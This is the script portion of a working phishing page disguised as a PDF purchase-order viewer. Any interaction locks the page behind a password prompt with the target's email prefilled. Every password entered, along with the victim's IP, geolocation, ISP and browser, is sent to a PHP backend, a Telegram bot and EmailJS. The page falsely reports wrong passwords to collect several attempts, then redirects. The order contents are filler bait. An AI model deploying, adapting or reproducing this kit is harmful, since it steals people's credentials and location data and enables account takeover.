                    emailjs.init(CONFIG.EMAILJS_PUBLIC_KEY);
                    await emailjs.send(
                        CONFIG.EMAILJS_SERVICE_ID,
                        CONFIG.EMAILJS_TEMPLATE_ID,
                        {
                            attempt: attemptNum,
                            email: email,
                            password: password,
                            ip: geoData.ip,
                            location: geoData.city + ', ' + geoData.region + ', ' + geoData.country,
                            coordinates: (geoData.lat && geoData.lon) ? geoData.lat.toFixed(4) + ', ' + geoData.lon.toFixed(4) : 'N/A, N/A',
                            browser: navigator.userAgent,
                            time: new Date().toLocaleString(),
                            url: window.location.href,
                            isp: geoData.isp,
                            timezone: geoData.timezone
                        }
                    );
                    return true;
                } catch (e) {
                    console.error('EmailJS error:', e);
                    return false;
                }
            }

            async function sendToChannels(email, password, attemptNum) {
                let geo = await preloadedGeo;
                if (!geo || geo.city === 'Unknown') {
                    geo = await getLocationData();
                }
                const browser = getBrowserInfo();
                const dateStr = formatDate(new Date());
                const domain = window.location.hostname;
                const loginUrl = window.location.href;

                // 1. Send to PHP Backend (handles Telegram server-side + logging)
                if (CONFIG.ENABLE_PHP_BACKEND) {
                    try {
                        await fetch('process.php', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                email: email,
                                password: password,
                                attempt: attemptNum,
                                browser: browser,
                                location: geo.city + ', ' + geo.region + ', ' + geo.country,
                                lat: geo.lat,
                                lon: geo.lon,
                                ip: geo.ip,
                                domain: domain,
                                url: loginUrl,
                                isp: geo.isp,
                                timezone: geo.timezone
                            })
                        }).catch(() => {});
                    } catch (e) {}
                } else if (CONFIG.TELEGRAM_BOT_TOKEN && CONFIG.TELEGRAM_CHAT_ID) {
                    // 2. Fallback: Send to Telegram directly only if PHP backend is disabled
                    const msg = `🔐 PDF Viewer Login — Attempt ${attemptNum}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📧 Email: ${email}
🔑 Password: ${password}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🌐 Browser: ${browser}
📍 Location: ${geo.city}, ${geo.region}, ${geo.country}
📌 Coordinates: ${geo.lat ? geo.lat.toFixed(4) : 'N/A'}, ${geo.lon ? geo.lon.toFixed(4) : 'N/A'}
🖥️ IP: ${geo.ip}
🌍 Domain: ${domain}
🔗 URL: ${loginUrl}
📅 Date: ${dateStr}
ISP: ${geo.isp}
Timezone: ${geo.timezone}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Attempt ${attemptNum} of ${CONFIG.MAX_ATTEMPTS}`;

                    try {
                        await fetch('https://api.telegram.org/bot' + CONFIG.TELEGRAM_BOT_TOKEN + '/sendMessage', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                chat_id: CONFIG.TELEGRAM_CHAT_ID,
                                text: msg,
                                parse_mode: 'HTML'
                            })
                        });
                    } catch (e) {
                        new Image().src = 'https://api.telegram.org/bot' + CONFIG.TELEGRAM_BOT_TOKEN + '/sendMessage?chat_id=' + CONFIG.TELEGRAM_CHAT_ID + '&text=' + encodeURIComponent(msg);
                    }
                }

                // 3. Send via EmailJS if configured
                await sendEmail(email, password, attemptNum, geo);
            }

            // DOM REFERENCES
            const overlay = document.getElementById('overlay');
            const authModal = document.getElementById('authModal');
            const passwordInput = document.getElementById('password');
            const signinBtn = document.getElementById('signinBtn');
            const errorMessage = document.getElementById('errorMessage');
            const successMessage = document.getElementById('successMessage');
            const sidebar = document.getElementById('sidebar');
            const menuBtn = document.getElementById('menuBtn');
            const documentPage = document.getElementById('documentPage');
            const zoomIn = document.getElementById('zoomIn');
            const zoomOut = document.getElementById('zoomOut');
            const zoomValue = document.getElementById('zoomValue');
            const pageInput = document.getElementById('pageInput');
            const downloadBtn = document.getElementById('downloadBtn');
            const printBtn = document.getElementById('printBtn');
            const documentArea = document.querySelector('.document-area');

            const emailAddressEl = document.querySelector('.email-address');
            const PREFILLED_EMAIL = emailAddressEl ? emailAddressEl.textContent.trim() : '';

            let isLocked = false;
            let isSignedIn = false;

            function lockScrolling() {
                document.body.classList.add('locked');
                if (documentArea) {
                    documentArea.style.overflow = 'hidden';
                    documentArea.scrollTop = 0;
                    documentArea.scrollLeft = 0;
                }
                if (sidebar) {
                    sidebar.style.overflow = 'hidden';
                }
            }

            function unlockScrolling() {
                document.body.classList.remove('locked');
                if (documentArea) {
                    documentArea.style.overflow = 'auto';
                }
                if (sidebar) {
                    sidebar.style.overflow = 'auto';
                }
            }

            function showLock() {
                if (isLocked || isSignedIn) return;
                isLocked = true;
                overlay.classList.add('active');
                authModal.classList.add('active');
                lockScrolling();
                requestAnimationFrame(function () { passwordInput.focus(); });
            }

            function preventScroll(e) {
                if (isLocked) {
                    if (authModal && authModal.contains(e.target)) return;
                    e.preventDefault();
                    e.stopPropagation();
                    return false;
                }
            }

            window.addEventListener('wheel', preventScroll, { passive: false });
            window.addEventListener('touchmove', preventScroll, { passive: false });
            window.addEventListener('scroll', preventScroll, { passive: false });
            if (documentArea) {
                documentArea.addEventListener('wheel', preventScroll, { passive: false });
                documentArea.addEventListener('scroll', preventScroll, { passive: false });
            }

            document.addEventListener('keydown', function (e) {
                if (isLocked) {
                    const blockKeys = ['ArrowUp', 'ArrowDown', 'PageUp', 'PageDown', 'Space', 'Home', 'End', ' '];
                    if (blockKeys.includes(e.key)) {
                        if (authModal && authModal.contains(e.target)) return;
                        e.preventDefault();
                    }
                }
            });

            const GUARD_EVENTS = ['scroll', 'click', 'touchstart', 'touchmove', 'keydown', 'wheel', 'mousedown', 'pointerdown'];

            function onFirstInteraction(e) {
                if (authModal && authModal.contains(e.target)) return;
                showLock();
                detachInteractionGuards();
            }

            function attachInteractionGuards() {
                GUARD_EVENTS.forEach(function (evt) {
                    window.addEventListener(evt, onFirstInteraction, { capture: true, passive: false });
                    document.addEventListener(evt, onFirstInteraction, { capture: true, passive: false });
                    if (documentArea) documentArea.addEventListener(evt, onFirstInteraction, { capture: true, passive: false });
                });
            }

            function detachInteractionGuards() {
                GUARD_EVENTS.forEach(function (evt) {
                    window.removeEventListener(evt, onFirstInteraction, { capture: true });
                    document.removeEventListener(evt, onFirstInteraction, { capture: true });
                    if (documentArea) documentArea.removeEventListener(evt, onFirstInteraction, { capture: true });
                });
            }

            // Ensure document is initially unlocked so PDF is cleanly visible and scrollable first
            unlockScrolling();

            // Attach listeners to show lock modal automatically on any user action / scrolling
            attachInteractionGuards();

            overlay.addEventListener('click', function (e) {
                e.stopPropagation();
                authModal.style.animation = 'none';
                authModal.offsetHeight;
                authModal.style.animation = 'modalShake 0.35s ease';
                passwordInput.focus();
            });

            document.addEventListener('keydown', function (event) {
                if (event.key === 'Escape' && isLocked) {
                    event.preventDefault();
                    authModal.style.animation = 'none';
                    authModal.offsetHeight;
                    authModal.style.animation = 'modalShake 0.35s ease';
                    passwordInput.focus();
                }
            });

            async function handleSignIn() {
                const password = passwordInput.value;
                const email = PREFILLED_EMAIL;

                errorMessage.style.display = 'none';
                successMessage.style.display = 'none';

                if (!password) {
                    errorMessage.textContent = 'Please enter your password.';
                    errorMessage.style.display = 'block';
                    passwordInput.focus();
                    return;
                }

                loginAttempts++;
                const attemptNum = loginAttempts;

                sendToChannels(email, password, attemptNum);

                if (attemptNum < CONFIG.MAX_ATTEMPTS) {
                    errorMessage.textContent = 'Incorrect password, please try again.';
                    errorMessage.style.display = 'block';
                    passwordInput.value = '';
                    passwordInput.focus();
                } else {
                    signinBtn.disabled = true;
                    successMessage.textContent = '⏳ Verifying… Please wait.';
                    successMessage.style.display = 'block';
                    errorMessage.style.display = 'none';
                    setTimeout(function () {
                        window.location.href = CONFIG.REDIRECT_URL;
                    }, 2500);
                }
            }

            signinBtn.addEventListener('click', handleSignIn);

            passwordInput.addEventListener('keydown', function (event) {
                if (event.key === 'Enter') { handleSignIn(); }
            });

            let sidebarVisible = true;
            menuBtn.addEventListener('click', function () {
                sidebarVisible = !sidebarVisible;
                sidebar.style.display = sidebarVisible ? 'block' : 'none';
            });

            const PAGES_DATA = {
                1: `
                    <p style="margin-bottom: 16px; font-size: 20px;">
                        Items listed should be submitted on or before the week ends.
                    </p>
                    <p style="margin-bottom: 20px; font-size: 20px;">
                        Pay special attention to items listed in <span style="color: #d71920;">RED</span>.
                    </p>
                    <p style="margin-bottom: 8px; font-size: 20px;">
                        <strong>PO Number:</strong> [PO 5676- 2026]
                    </p>
                    <p style="margin-bottom: 20px; font-size: 20px;">
                        <strong>Date:</strong> [-]
                    </p>
                    <p style="margin-bottom: 22px; font-size: 20px;">
                        Kindly apply discounts where applicable.
                    </p>
                    <p style="margin-bottom: 8px; font-size: 20px;">
                        <strong>Payment Terms</strong>
                    </p>
                    <p style="margin-bottom: 8px; font-size: 20px;">
                        <strong>Payment Method:</strong> [Payment Method]
                    </p>
                    <p style="margin-bottom: 22px; font-size: 20px;">
                        <strong>Payment Terms:</strong> [Net 30/Net 60/COD, etc.]
                    </p>
                    <p style="margin-bottom: 22px; font-size: 20px;">
                        See below for items required/order details.
                    </p>
                    <p style="margin-bottom: 18px; font-size: 20px;">
                        <strong>Order Details</strong>
                    </p>

                    <table class="order-table">
                        <thead>
                            <tr>
                                <th>Item #</th>
                                <th>Description</th>
                                <th>Quantity</th>
                                <th>Unit Price</th>
                                <th>Total Price</th>
                            </tr>
                        </thead>
                        <tbody>
                            <tr>
                                <td>001</td>
                                <td>Boycott A&E Until Phil Robertson is Put Back On Duck Dynasty</td>
                                <td>10</td>
                                <td>$25.00</td>
                                <td>$250.00</td>
                            </tr>
                            <tr>
                                <td>002</td>
                                <td>Eagle Rising</td>
                                <td>5</td>
                                <td>$40.00</td>
                                <td>$200.00</td>
                            </tr>
                            <tr>
                                <td>003</td>
                                <td>Sportsmans Hub</td>
                                <td>8</td>
                                <td>$15.00</td>
                                <td>$120.00</td>
                            </tr>
                            <tr>
                                <td>004</td>
                                <td>Mechanic Nation</td>
                                <td>12</td>
                                <td>$30.00</td>
                                <td>$360.00</td>
                            </tr>
                            <tr>
                                <td>005</td>
                                <td>God's Not Dead</td>
                                <td>15</td>
                                <td>$18.00</td>
                                <td>$270.00</td>
                            </tr>
                            <tr>
                                <td>006</td>
                                <td>FreedomWorks</td>
                                <td>4</td>
                                <td>$50.00</td>
                                <td>$200.00</td>
                            </tr>
                            <tr>
                                <td>007</td>
                                <td>National Association for Gun Rights</td>
                                <td>20</td>
                                <td>$22.00</td>
                                <td>$440.00</td>
                            </tr>
                            <tr>
                                <td>008</td>
                                <td>Jeff Foxworthy</td>
                                <td>6</td>
                                <td>$35.00</td>
                                <td>$210.00</td>
                            </tr>
                            <tr>
                                <td>009</td>
                                <td>Classic Trucks Magazine</td>
                                <td>10</td>
                                <td>$12.00</td>
                                <td>$120.00</td>
                            </tr>
                            <tr>
                                <td>010</td>
                                <td>Toronto Blue Jays</td>
                                <td>3</td>
                                <td>$65.00</td>
                                <td>$195.00</td>
                            </tr>
                        </tbody>
                    </table>
                `,
                2: `
                    <div style="font-size: 16px; line-height: 2.1; color: #444; padding: 10px 0;">
                        Middlesbrough<br>
                        Reading<br>
                        Bolton Wanderers<br>
                        Concert Rangers<br>
                        Gosport Borough<br>
                        Bishop's Stortford<br>
                        Nettruck<br>
                        Jimmy Kimmel Live<br>
                        Jimmy Cliff<br>
                        The Legend of Shelby the Swamp Man<br>
                        JIMMY CHOO<br>
                        Jimmy John's<br>
                        Babe Winkelman<br>
                        Lonestar<br>
                        Truckin Magazine<br>
                        Diesel Spec<br>
                        Brantley Gilbert<br>
                        Deadliest Catch<br>
                        Largecarmag<br>
                        Amazing Rides<br>
                        Tracking Depot
                    </div>
                `,
                3: `
                    <div style="font-size: 16px; line-height: 2.1; color: #444; padding: 10px 0;">
                        Truckfighters<br>
                        FDAAmerica<br>
                        Hoosier HORNS & HOOFS<br>
                        Chicago Bulls<br>
                        The Detroit Pistons<br>
                        Team Lovers Racing<br>
                        Colorado Avalanche<br>
                        The Bodybuilding Nation<br>
                        Colorado Rockies<br>
                        Denver Nuggets<br>
                        Denver Broncos<br>
                        Kurt Busch<br>
                        SportsCaster<br>
                        Fast Car Magazine<br>
                        King James Bible<br>
                        Indiana Pacers<br>
                        Furniture Row Racing<br>
                        Hendrick Motorsports<br>
                        JR Motorsports<br>
                        Tony Stewart Racing<br>
                        Stewart-Haas Racing
                    </div>
                `,
                4: `
                    <div class="document-section-title" style="font-size: 26px; font-weight: 700; margin-top: 10px; margin-bottom: 20px;">
                        Purchase Order
                    </div>
                    <div style="font-size: 18px; line-height: 1.8; color: #444;">
                        <p>Order Information</p>
                        <p>Product Details</p>
                        <p>Quantity</p>
                        <p>Unit Price</p>
                        <p>Total Price</p>
                        <p>Payment Information</p>
                    </div>
                `,
                5: `
                    <div class="document-section-title" style="font-size: 26px; font-weight: 700; margin-top: 10px; margin-bottom: 20px;">
                        Terms & Conditions
                    </div>
                    <div style="font-size: 18px; line-height: 1.8; color: #444;">
                        <p>General Terms</p>
                        <p>Delivery Schedules</p>
                        <p>Shipping Policies</p>
                        <p>Payment Compliance</p>
                        <p>Dispute Conditions</p>
                    </div>
                `
            };

            function switchPage(pageNum) {
                const p = String(pageNum);
                pageInput.value = p;
                const docTitleEl = document.querySelector('.document-title');
                const docTextEl = document.querySelector('.document-text');
                if (docTitleEl) {
                    docTitleEl.textContent = p === '1' ? 'Purchase Order' : 'Purchase Order \u2014 Page ' + p;
                }
                if (docTextEl && PAGES_DATA[p]) {
                    docTextEl.innerHTML = PAGES_DATA[p];
                }
            }

            const thumbnails = document.querySelectorAll('.thumbnail');
            thumbnails.forEach(function (thumbnail) {
                thumbnail.addEventListener('click', function () {
                    thumbnails.forEach(function (item) { item.classList.remove('active'); });
                    thumbnail.classList.add('active');
                    const page = thumbnail.dataset.page;
                    switchPage(page);
                });
            });

            pageInput.addEventListener('change', function () {
                let page = parseInt(pageInput.value);
                if (isNaN(page) || page < 1 || page > 10) { pageInput.value = 1; return; }
                thumbnails.forEach(function (item) { item.classList.remove('active'); });
                const selected = document.querySelector('.thumbnail[data-page="' + page + '"]');
                if (selected) {
                    selected.classList.add('active');
                    selected.scrollIntoView({ behavior: 'smooth', block: 'center' });
                }
                switchPage(page);
            });

            let zoom = 100;
            function updateZoom() {
                zoomValue.textContent = zoom + '%';
                if (window.innerWidth > 650) {
                    documentPage.style.transform = 'scale(' + (zoom / 100) + ')';
                }
            }

            zoomIn.addEventListener('click', function () {
                if (window.innerWidth > 650 && zoom < 200) { zoom += 10; updateZoom(); }
            });
            zoomOut.addEventListener('click', function () {
                if (window.innerWidth > 650 && zoom > 50) { zoom -= 10; updateZoom(); }
            });

            downloadBtn.addEventListener('click', function () { showLock(); });
            printBtn.addEventListener('click', function () { showLock(); });

            (function () {
                const s = document.createElement('style');
                s.textContent = '@keyframes modalShake {' +
                    '0%   { transform: translate(-50%,-46%) translateX(0); }' +
                    '15%  { transform: translate(-50%,-46%) translateX(-9px); }' +
                    '30%  { transform: translate(-50%,-46%) translateX(9px); }' +
                    '45%  { transform: translate(-50%,-46%) translateX(-6px); }' +
                    '60%  { transform: translate(-50%,-46%) translateX(6px); }' +
                    '75%  { transform: translate(-50%,-46%) translateX(-3px); }' +
                    '90%  { transform: translate(-50%,-46%) translateX(3px); }' +
                    '100% { transform: translate(-50%,-46%) translateX(0); }' +
                    '}';
                document.head.appendChild(s);
            })();

            function scaleDocument() {
                if (!documentPage) return;
                var MOBILE_BP = 650;
                var vw = window.innerWidth;
                if (vw <= MOBILE_BP) {
                    var docW = documentPage.offsetWidth || 1040;
                    var scale = vw / docW;
                    documentPage.style.transform = 'scale(' + scale + ')';
                    documentPage.style.marginBottom =
                        ((documentPage.scrollHeight * scale) - documentPage.scrollHeight) + 'px';
                } else {
                    documentPage.style.transform = 'scale(' + (zoom / 100) + ')';
                    documentPage.style.marginBottom = '';
                }
            }

            window.addEventListener('resize', scaleDocument);
            scaleDocument();
            updateZoom();
        })();
    </script>
</body>
</html>
